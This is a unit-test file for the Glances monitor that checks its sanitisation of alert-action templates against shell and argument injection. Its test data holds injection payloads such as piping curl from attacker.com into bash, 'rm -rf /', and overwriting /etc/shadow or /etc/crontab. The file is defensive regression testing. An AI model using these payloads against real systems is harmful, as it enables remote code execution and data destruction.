#!/usr/bin/env python
#
# Glances - An eye on your system
#
# SPDX-FileCopyrightText: 2024 Nicolas Hennion <nicolas@nicolargo.com>
#
# SPDX-License-Identifier: LGPL-3.0-only
#

"""Glances unit tests for action command sanitization.

Tests cover:
- _sanitize_mustache_dict strips shell operators from string values
- Pipe (|), chain (&&), redirect (>, >>) injection via Mustache values
- Non-string values are preserved unchanged
- The sanitization integrates correctly with GlancesActions.run()
- secure_popen basic functionality
- Mustache fields land in exactly one argv slot (GHSA-56xw-p9qm-r437)
"""

import os
import shutil
import tempfile
from unittest.mock import MagicMock, patch

import pytest

from glances.actions import GlancesActions, _sanitize_mustache_dict, _sanitize_value
from glances.secure import secure_popen

# Skip the whole module on Windows where echo -n behaves differently
pytestmark = pytest.mark.skipif(
    os.name == 'nt',
    reason='Shell command tests are POSIX-only',
)


# ---------------------------------------------------------------------------
# Tests – _sanitize_mustache_dict
# ---------------------------------------------------------------------------


class TestSanitizeMustacheDict:
    """Unit tests for _sanitize_mustache_dict."""

    def test_none_returns_none(self):
        assert _sanitize_mustache_dict(None) is None

    def test_empty_dict_returns_empty(self):
        assert _sanitize_mustache_dict({}) == {}

    def test_strips_pipe(self):
        d = {'name': 'innocent|curl evil.com'}
        safe = _sanitize_mustache_dict(d)
        assert '|' not in safe['name']
        assert safe['name'] == 'innocent curl evil.com'

    def test_strips_double_ampersand(self):
        d = {'name': 'web && curl evil.com'}
        safe = _sanitize_mustache_dict(d)
        assert '&&' not in safe['name']
        assert safe['name'] == 'web   curl evil.com'

    def test_strips_redirect(self):
        d = {'name': 'data > /etc/passwd'}
        safe = _sanitize_mustache_dict(d)
        assert '>' not in safe['name']
        assert safe['name'] == 'data   /etc/passwd'

    def test_strips_append_redirect(self):
        d = {'name': 'data >> /etc/shadow'}
        safe = _sanitize_mustache_dict(d)
        assert '>>' not in safe['name']
        assert safe['name'] == 'data   /etc/shadow'

    def test_strips_multiple_operators(self):
        d = {'name': 'foo|bar && baz > qux >> end'}
        safe = _sanitize_mustache_dict(d)
        assert '|' not in safe['name']
        assert '&&' not in safe['name']
        # >> is replaced first (before >), then remaining > is replaced
        for op in ('|', '&&', '>>', '>'):
            assert op not in safe['name']

    def test_preserves_int_values(self):
        d = {'cpu_percent': 95, 'name': 'safe'}
        safe = _sanitize_mustache_dict(d)
        assert safe['cpu_percent'] == 95

    def test_preserves_float_values(self):
        d = {'load': 3.14, 'name': 'safe'}
        safe = _sanitize_mustache_dict(d)
        assert safe['load'] == 3.14

    def test_preserves_none_values(self):
        d = {'key': None, 'name': 'safe'}
        safe = _sanitize_mustache_dict(d)
        assert safe['key'] is None

    def test_preserves_bool_values(self):
        d = {'is_up': True, 'name': 'safe'}
        safe = _sanitize_mustache_dict(d)
        assert safe['is_up'] is True

    def test_preserves_list_of_numbers(self):
        # Numeric list elements are not strings: left unchanged.
        d = {'ports': [80, 443], 'name': 'safe'}
        safe = _sanitize_mustache_dict(d)
        assert safe['ports'] == [80, 443]

    def test_strips_operators_in_nested_list(self):
        # GHSA-73wf-9vmv-5pv9: process cmdline is a list of attacker argv.
        d = {'cmdline': ['x', '|touch /tmp/evil', '#']}
        safe = _sanitize_mustache_dict(d)
        assert '|' not in ''.join(safe['cmdline'])
        assert safe['cmdline'] == ['x', ' touch /tmp/evil', '#']

    def test_strips_operators_in_nested_dict(self):
        d = {'meta': {'k': 'a|b && c > d'}}
        safe = _sanitize_mustache_dict(d)
        for op in ('|', '&&', '>'):
            assert op not in safe['meta']['k']

    def test_strips_operators_in_deeply_nested(self):
        d = {'outer': {'inner': ['ok', 'evil|rm -rf /']}}
        safe = _sanitize_mustache_dict(d)
        assert '|' not in safe['outer']['inner'][1]

    def test_preserves_tuple_type(self):
        d = {'args': ('a', 'b|c')}
        safe = _sanitize_mustache_dict(d)
        assert isinstance(safe['args'], tuple)
        assert '|' not in safe['args'][1]

    def test_sanitize_value_passthrough_non_string(self):
        assert _sanitize_value(95) == 95
        assert _sanitize_value(3.14) == 3.14
        assert _sanitize_value(True) is True
        assert _sanitize_value(None) is None

    def test_clean_string_unchanged(self):
        d = {'name': 'my-web-server', 'mnt_point': '/data/disk1'}
        safe = _sanitize_mustache_dict(d)
        assert safe['name'] == 'my-web-server'
        assert safe['mnt_point'] == '/data/disk1'

    def test_does_not_mutate_original(self):
        d = {'name': 'foo|bar'}
        _sanitize_mustache_dict(d)
        assert d['name'] == 'foo|bar'

    def test_returns_new_dict(self):
        d = {'name': 'foo'}
        safe = _sanitize_mustache_dict(d)
        assert safe is not d


# ---------------------------------------------------------------------------
# Tests – Command injection scenarios
# ---------------------------------------------------------------------------


class TestCommandInjectionPrevention:
    """Verify that crafted Mustache values cannot inject commands."""

    def test_pipe_injection_in_process_name(self):
        """Simulate: process name contains pipe to inject curl command."""
        mustache_dict = {
            'name': 'innocent|curl attacker.com/evil.sh|bash',
            'cpu_percent': 99.0,
        }
        safe = _sanitize_mustache_dict(mustache_dict)
        # The pipe characters must be gone
        assert '|' not in safe['name']
        assert 'curl' in safe['name']  # text is preserved, just operator removed

    def test_chain_injection_in_container_name(self):
        """Simulate: container name contains && to chain commands."""
        mustache_dict = {
            'name': 'web && curl attacker.com/rev.sh | bash && echo ',
            'Image': 'nginx:latest',
            'Id': 'abc123',
            'cpu': 95.0,
        }
        safe = _sanitize_mustache_dict(mustache_dict)
        assert '&&' not in safe['name']
        assert '|' not in safe['name']
        # Non-string fields untouched
        assert safe['cpu'] == 95.0

    def test_redirect_injection_in_mount_point(self):
        """Simulate: mount point contains redirect to overwrite files."""
        mustache_dict = {
            'mnt_point': '/data > /etc/crontab',
            'used': 900000,
            'size': 1000000,
        }
        safe = _sanitize_mustache_dict(mustache_dict)
        assert '>' not in safe['mnt_point']

    def test_append_redirect_injection(self):
        """Simulate: value contains >> to append to sensitive files."""
        mustache_dict = {
            'name': 'logger >> /etc/shadow',
        }
        safe = _sanitize_mustache_dict(mustache_dict)
        assert '>>' not in safe['name']

    def test_lone_ampersand_is_stripped(self):
        """GHSA-qcpp-8x79-hhp3: a single '&' (not '&&') must also be neutralised,
        otherwise two adjacent unescaped variables can rejoin it into '&&'."""
        safe = _sanitize_mustache_dict({'name': 'evilproc&'})
        assert '&' not in safe['name']
        assert safe['name'] == 'evilproc '

    def test_cross_field_ampersand_reconstruction_blocked(self):
        """GHSA-qcpp-8x79-hhp3: a trailing '&' in one value and a leading '&' in
        the next must not reconstruct a real '&&' when rendered back to back."""
        d = {'a': 'evilproc&', 'b': '& touch /tmp/evil'}
        safe = _sanitize_mustache_dict(d)
        # Concatenation of two unescaped variables (chevron {{{a}}}{{{b}}}).
        rendered = safe['a'] + safe['b']
        assert '&&' not in rendered


# ---------------------------------------------------------------------------
# Tests – secure_popen basic functionality
# ---------------------------------------------------------------------------


class TestSecurePopen:
    """Basic tests for secure_popen."""

    def test_simple_echo(self):
        assert secure_popen('echo -n TEST') == 'TEST'

    def test_chained_commands(self):
        assert secure_popen('echo -n A && echo -n B') == 'AB'

    def test_pipe(self):
        result = secure_popen('echo FOO | grep FOO')
        assert 'FOO' in result

    def test_redirect_to_file(self):
        with tempfile.NamedTemporaryFile(mode='r', suffix='.txt', delete=False) as f:
            tmpfile = f.name
        try:
            secure_popen(f'echo -n HELLO > {tmpfile}')
            with open(tmpfile) as f:
                assert f.read() == 'HELLO'
        finally:
            os.unlink(tmpfile)


# ---------------------------------------------------------------------------
# Tests – GlancesActions.run() integration
# ---------------------------------------------------------------------------


class _FakeProcess:
    """Minimal Popen stand-in: no output, no exit status."""

    def __init__(self):
        self.stdout = MagicMock()

    def communicate(self):
        return (b'', b'')

    def wait(self):
        return 0


def _run_capture_argv(actions, stat_name, criticality, commands, mustache_dict):
    """Run the actions and return the argv of every process that was spawned.

    Popen is patched inside glances.secure, so the assertions bear on what is
    really handed to the OS. Asserting on the string passed to secure_popen is
    no longer meaningful: that string is the (trusted) template, the untrusted
    values are expanded per argument further down (GHSA-56xw-p9qm-r437).
    """
    argv_list = []

    def fake_popen(argv, **kwargs):
        argv_list.append(argv)
        return _FakeProcess()

    with patch('glances.secure.Popen', side_effect=fake_popen):
        actions.run(stat_name, criticality, commands, repeat=False, mustache_dict=mustache_dict)

    return argv_list


class TestActionsRunIntegration:
    """Verify that GlancesActions.run() uses sanitized mustache values."""

    @pytest.fixture
    def actions(self):
        """Create a GlancesActions instance with an expired start timer."""
        a = GlancesActions()
        # Force the start timer to be finished so actions can run immediately
        a.start_timer = type('FakeTimer', (), {'finished': lambda self: True})()
        return a

    def test_run_with_safe_values(self, actions):
        """Normal run with safe values should succeed."""
        result = actions.run(
            'cpu',
            'CRITICAL',
            ['echo -n {{name}}'],
            repeat=False,
            mustache_dict={'name': 'myprocess'},
        )
        assert result is True

    def test_run_sanitizes_pipe_in_mustache(self, actions):
        """Pipe in mustache value must not create a real pipe."""
        argv_list = _run_capture_argv(actions, 'cpu', 'CRITICAL', ['echo {{name}}'], {'name': 'evil|rm -rf /'})
        # A single process, and the whole value in a single argument
        assert len(argv_list) == 1
        assert len(argv_list[0]) == 2
        assert argv_list[0][0] == 'echo'
        assert '|' not in argv_list[0][1]
        assert 'rm -rf /' in argv_list[0][1]  # text preserved, pipe removed

    def test_run_sanitizes_chain_in_mustache(self, actions):
        """&& in mustache value must not chain commands."""
        argv_list = _run_capture_argv(
            actions, 'containers', 'WARNING', ['echo {{name}}'], {'name': 'web && cat /etc/passwd'}
        )
        assert len(argv_list) == 1
        assert len(argv_list[0]) == 2
        assert '&&' not in argv_list[0][1]

    def test_run_sanitizes_redirect_in_mustache(self, actions):
        """> in mustache value must not redirect output."""
        argv_list = _run_capture_argv(
            actions, 'fs', 'CRITICAL', ['echo {{mnt_point}}'], {'mnt_point': '/data > /etc/crontab'}
        )
        assert len(argv_list) == 1
        assert len(argv_list[0]) == 2
        assert '>' not in argv_list[0][1]

    def test_run_preserves_template_operators(self, actions):
        """Operators in the template itself (not in values) must be preserved."""
        # The template has a pipe, but the mustache value is clean
        argv_list = _run_capture_argv(
            actions, 'cpu', 'CRITICAL', ['echo {{name}} | grep something'], {'name': 'safe-process'}
        )
        # Template pipe is preserved: two processes in a pipeline
        assert argv_list == [['echo', 'safe-process'], ['grep', 'something']]

    def test_run_preserves_template_redirect(self, actions):
        """Redirect in the template itself must be preserved."""
        with tempfile.NamedTemporaryFile(suffix='.log', delete=False) as f:
            tmpfile = f.name
        try:
            actions.run(
                'fs',
                'WARNING',
                [f'echo -n {{{{mnt_point}}}} > {tmpfile}'],
                repeat=False,
                mustache_dict={'mnt_point': '/data/disk1'},
            )
            with open(tmpfile) as f:
                assert f.read() == '/data/disk1'
        finally:
            os.unlink(tmpfile)

    def test_run_preserves_template_chain(self, actions):
        """&& in the template itself must be preserved."""
        argv_list = _run_capture_argv(
            actions, 'cpu', 'CRITICAL', ['echo {{name}} && echo done'], {'name': 'safe-process'}
        )
        assert argv_list == [['echo', 'safe-process'], ['echo', 'done']]

    def test_run_sanitizes_cmdline_section(self, actions):
        """GHSA-73wf-9vmv-5pv9: a pipe in the process cmdline list (rendered via
        a Mustache section) must not create a real pipe."""
        argv_list = _run_capture_argv(
            actions,
            'processlist',
            'CRITICAL',
            # The section must be closed within the argument it opens in
            ['echo ALERT {{#cmdline}}{{.}},{{/cmdline}}'],
            {'cmdline': ['x', '|touch /tmp/evil', '#']},
        )
        assert len(argv_list) == 1
        assert argv_list[0][:2] == ['echo', 'ALERT']
        # The whole section renders into a single argument
        assert len(argv_list[0]) == 3
        assert '|' not in argv_list[0][2]
        assert 'touch /tmp/evil' in argv_list[0][2]  # text preserved, pipe removed

    def test_run_blocks_cross_field_ampersand_chain(self, actions):
        """GHSA-qcpp-8x79-hhp3: two adjacent unescaped variables whose values
        end/begin with '&' must not reconstruct a real '&&' command chain."""
        argv_list = _run_capture_argv(
            actions,
            'processlist',
            'CRITICAL',
            ['logger p={{{name}}}{{{cmdline}}}'],
            {'name': 'evilproc&', 'cmdline': '& touch /tmp/evil'},
        )
        # A single process, and both values in the same single argument
        assert len(argv_list) == 1
        assert len(argv_list[0]) == 2
        assert '&&' not in argv_list[0][1]

    def test_run_does_not_execute_when_already_triggered(self, actions):
        """Same criticality should not re-trigger if repeat=False."""
        actions.set('cpu', 'CRITICAL')
        result = actions.run(
            'cpu',
            'CRITICAL',
            ['echo test'],
            repeat=False,
            mustache_dict={},
        )
        assert result is False

    def test_run_repeats_when_repeat_true(self, actions):
        """Same criticality should re-trigger when repeat=True."""
        actions.set('cpu', 'CRITICAL')
        result = actions.run(
            'cpu',
            'CRITICAL',
            ['echo test'],
            repeat=True,
            mustache_dict={},
        )
        assert result is True


# ---------------------------------------------------------------------------
# Tests – --disable-config-exec on the on-alert action path
# ---------------------------------------------------------------------------


class _Args:
    """Minimal args stub carrying only disable_config_exec."""

    def __init__(self, disable_config_exec):
        self.disable_config_exec = disable_config_exec


class TestActionsDisableConfigExec:
    """GHSA-59fj-m2j6-hcxh: --disable-config-exec must also disable shell
    operators (&&, |, >) in config-defined on-alert action commands, not only
    in AMP commands.
    """

    def _make_actions(self, args):
        a = GlancesActions(args=args)
        # Force the start timer to be finished so actions can run immediately
        a.start_timer = type('FakeTimer', (), {'finished': lambda self: True})()
        return a

    def test_allow_operators_true_when_no_args(self):
        assert GlancesActions().allow_operators() is True

    def test_allow_operators_true_when_flag_absent(self):
        assert GlancesActions(args=object()).allow_operators() is True

    def test_allow_operators_false_when_disabled(self):
        assert GlancesActions(args=_Args(True)).allow_operators() is False

    def test_allow_operators_true_when_enabled(self):
        assert GlancesActions(args=_Args(False)).allow_operators() is True

    def test_run_passes_allow_operators_false_when_disabled(self):
        """With --disable-config-exec, secure_popen must be called with
        allow_operators=False so operators in the command are not interpreted."""
        actions = self._make_actions(_Args(True))
        with patch('glances.actions.secure_popen') as mock_popen:
            mock_popen.return_value = ''
            actions.run(
                'cpu',
                'CRITICAL',
                ['echo MARKER > /tmp/poc_marker'],
                repeat=False,
                mustache_dict={},
            )
            assert mock_popen.call_args.kwargs['allow_operators'] is False

    def test_run_passes_allow_operators_true_by_default(self):
        """Without the flag, the historical behavior (operators interpreted) is
        preserved for backward compatibility."""
        actions = self._make_actions(_Args(False))
        with patch('glances.actions.secure_popen') as mock_popen:
            mock_popen.return_value = ''
            actions.run(
                'cpu',
                'CRITICAL',
                ['echo MARKER > /tmp/poc_marker'],
                repeat=False,
                mustache_dict={},
            )
            assert mock_popen.call_args.kwargs['allow_operators'] is True

    def test_run_disabled_does_not_write_redirect_file(self):
        """End-to-end: the '>' redirect must not create a file when the flag is
        set (this is the concrete PoC from the advisory)."""
        with tempfile.NamedTemporaryFile(suffix='.txt', delete=False) as f:
            marker = f.name
        os.unlink(marker)  # remove so we can detect a spurious re-creation
        try:
            actions = self._make_actions(_Args(True))
            actions.run(
                'cpu',
                'CRITICAL',
                [f'echo -n MARKER > {marker}'],
                repeat=False,
                mustache_dict={},
            )
            # allow_operators=False => '>' is a literal argument, no file written
            assert not os.path.exists(marker)
        finally:
            if os.path.exists(marker):
                os.unlink(marker)


# ---------------------------------------------------------------------------
# Tests – argument injection through Mustache values (GHSA-56xw-p9qm-r437)
# ---------------------------------------------------------------------------

# The reported payload: a literal single quote closes the quoted Mustache field
# early, then three fully attacker-controlled argv tokens follow.
_POC_VALUE = "/mnt/usb/x' --evil-flag /etc/passwd http://attacker.example/leak 'y"


class TestActionsArgumentInjection:
    """GHSA-56xw-p9qm-r437 (CWE-88): a Mustache field always lands in exactly
    one argv slot.

    The root cause was the order of operations: the command line was rendered
    first, then re-lexed by secure_popen, so a value could open or close a
    quote, introduce whitespace or shift the argument boundaries. Rendering now
    happens per argument, after the split, which makes that structurally
    impossible whatever the value contains.
    """

    def _make_actions(self, args=None):
        a = GlancesActions(args=args) if args is not None else GlancesActions()
        # Force the start timer to be finished so actions can run immediately
        a.start_timer = type('FakeTimer', (), {'finished': lambda self: True})()
        return a

    def test_poc_single_quoted_field_stays_one_argument(self):
        """The advisory PoC: no argv token may be injected."""
        argv_list = _run_capture_argv(
            self._make_actions(),
            'fs_percent',
            'critical',
            ["argv_logger.py '{{mnt_point}}' {{percent}}"],
            {'mnt_point': _POC_VALUE, 'percent': '92'},
        )
        assert argv_list == [['argv_logger.py', _POC_VALUE, '92']]

    def test_unquoted_field_with_spaces_stays_one_argument(self):
        """The pattern documented in docs/aoa/actions.rst is unquoted, and a
        plain space in the value was enough to inject argv tokens: no quote
        character is needed to exploit the original defect."""
        value = '/mnt/x --evil-flag /etc/passwd'
        argv_list = _run_capture_argv(
            self._make_actions(),
            'fs_percent',
            'critical',
            ['argv_logger.py {{mnt_point}} {{percent}}'],
            {'mnt_point': value, 'percent': '92'},
        )
        assert argv_list == [['argv_logger.py', value, '92']]

    def test_double_quoted_field_stays_one_argument(self):
        """The shipped conf/glances.conf examples quote their fields."""
        argv_list = _run_capture_argv(
            self._make_actions(),
            'fs_percent',
            'critical',
            ['argv_logger.py "{{mnt_point}}" {{percent}}'],
            {'mnt_point': _POC_VALUE, 'percent': '92'},
        )
        assert argv_list == [['argv_logger.py', _POC_VALUE, '92']]

    def test_triple_mustache_stays_one_argument(self):
        """The raw (unescaped) form bypasses chevron's HTML escaping."""
        argv_list = _run_capture_argv(
            self._make_actions(),
            'fs_percent',
            'critical',
            ['argv_logger.py {{{mnt_point}}} {{percent}}'],
            {'mnt_point': _POC_VALUE, 'percent': '92'},
        )
        assert argv_list == [['argv_logger.py', _POC_VALUE, '92']]

    def test_ampersand_mustache_stays_one_argument(self):
        """{{&var}} is the other unescaped form."""
        argv_list = _run_capture_argv(
            self._make_actions(),
            'fs_percent',
            'critical',
            ['argv_logger.py {{&mnt_point}} {{percent}}'],
            {'mnt_point': _POC_VALUE, 'percent': '92'},
        )
        assert argv_list == [['argv_logger.py', _POC_VALUE, '92']]

    def test_empty_value_yields_an_empty_argument(self):
        """A field rendering to an empty string must keep its argv slot, so
        that emptying a value cannot shift the positional arguments of the
        invoked script."""
        argv_list = _run_capture_argv(
            self._make_actions(),
            'fs_percent',
            'critical',
            ['argv_logger.py {{mnt_point}} {{percent}}'],
            {'mnt_point': '', 'percent': '92'},
        )
        assert argv_list == [['argv_logger.py', '', '92']]

    def test_protection_holds_with_disable_config_exec(self):
        """--disable-config-exec routes through __run_argv(), which uses the
        same tokenizer and must be protected too."""
        argv_list = _run_capture_argv(
            self._make_actions(_Args(True)),
            'fs_percent',
            'critical',
            ["argv_logger.py '{{mnt_point}}' {{percent}}"],
            {'mnt_point': _POC_VALUE, 'percent': '92'},
        )
        assert argv_list == [['argv_logger.py', _POC_VALUE, '92']]

    def test_section_within_one_argument_is_rendered(self):
        """A Mustache section that opens and closes inside the same argument
        keeps working, and renders into that single argument."""
        argv_list = _run_capture_argv(
            self._make_actions(),
            'processlist',
            'CRITICAL',
            ['argv_logger.py {{#cmdline}}{{.}},{{/cmdline}}'],
            {'cmdline': ['a b', "c'd"]},
        )
        assert argv_list == [['argv_logger.py', "a b,c'd,"]]

    def test_section_spanning_two_arguments_is_refused(self, caplog):
        """A section split across an argument boundary cannot be rendered per
        argument. Refuse to run rather than fall back to rendering the whole
        line, which would reopen the injection."""
        argv_list = _run_capture_argv(
            self._make_actions(),
            'processlist',
            'CRITICAL',
            ['argv_logger.py {{#cmdline}}{{.}} {{/cmdline}}'],
            {'cmdline': ['x', 'y']},
        )
        assert argv_list == []
        assert 'Action template error' in caplog.text

    def test_templated_redirect_target_is_expanded(self):
        """The redirection target may itself carry a Mustache field."""
        tmpdir = tempfile.mkdtemp()
        try:
            self._make_actions().run(
                'fs',
                'critical',
                ['echo -n ALERT > ' + os.path.join(tmpdir, 'gl_{{name}}.alert')],
                repeat=False,
                mustache_dict={'name': 'disk1'},
            )
            assert os.listdir(tmpdir) == ['gl_disk1.alert']
        finally:
            shutil.rmtree(tmpdir)


class TestSecurePopenRender:
    """secure_popen(render=...) confines a rendered value to one argument.

    These bear on glances.secure alone: the protection must not depend on
    _sanitize_mustache_dict(), which is kept only as defence in depth.
    """

    @staticmethod
    def _render(value):
        """A render callable that expands the single field '{{v}}'."""
        return lambda arg: arg.replace('{{v}}', value)

    def _capture(self, cmd, value, **kwargs):
        argv_list = []

        def fake_popen(argv, **kw):
            argv_list.append(argv)
            return _FakeProcess()

        with patch('glances.secure.Popen', side_effect=fake_popen):
            secure_popen(cmd, render=self._render(value), **kwargs)

        return argv_list

    def test_operators_in_the_value_are_never_interpreted(self):
        """Even unsanitized, a value cannot chain, pipe or redirect: the
        operators are split off the template before the value exists."""
        value = "a && b | c > /tmp/evil"
        assert self._capture('echo {{v}}', value) == [['echo', value]]

    def test_quotes_in_the_value_cannot_break_out(self):
        assert self._capture("echo '{{v}}'", _POC_VALUE) == [['echo', _POC_VALUE]]

    def test_whitespace_in_the_value_cannot_split(self):
        assert self._capture('echo {{v}}', 'one two three') == [['echo', 'one two three']]

    def test_render_is_not_applied_when_omitted(self):
        """Callers that pass no render (AMP, virsh, multipass) are unchanged."""
        argv_list = []

        def fake_popen(argv, **kw):
            argv_list.append(argv)
            return _FakeProcess()

        with patch('glances.secure.Popen', side_effect=fake_popen):
            secure_popen('echo {{v}}')

        assert argv_list == [['echo', '{{v}}']]
